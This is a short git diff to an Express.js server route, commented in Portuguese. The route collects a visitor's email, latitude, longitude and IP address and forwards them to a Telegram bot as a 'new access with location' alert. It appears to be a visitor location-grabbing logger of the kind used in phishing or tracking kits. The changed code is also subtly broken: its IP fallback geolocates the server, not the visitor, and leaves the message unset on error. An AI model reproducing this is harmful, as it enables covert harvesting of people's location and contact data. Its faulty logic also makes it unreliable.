@@ -29,13 +29,30 @@ app.use(express.static(path.join(__dirname, '../public')));
 // Rota que recebe o POST com email, lat, lng
 app.post('/send', async (req, res) => {
   const email = req.body.email || 'não informado';
-  const lat = req.body.lat || 'desconhecido';
-  const lng = req.body.lng || 'desconhecido';
-  const ip = req.headers['x-forwarded-for']?.split(',').shift() || 
-              req.socket?.remoteAddress || 'IP não identificado';
 
+  let lat, lng;
+  let mensagem;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`;
+if (!req.body.lat || !req.body.lng) {
+  try {
+    const ipInfo = await fetch("https://ipapi.co/json/");
+    const data = await ipInfo.json();
+    lat = data.latitude || 'desconhecido';
+    lng = data.longitude || 'desconhecido';
+    mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip} loc com ip`;
+  } catch (error) {
+    lat = 'desconhecido';
+    lng = 'desconhecido';
+    console.error("Erro ao obter localização por IP:", error);
+  }
+} else {
+  lat = req.body.lat;
+  lng = req.body.lng;
+  mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`;
+}
+
+  
   const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
   
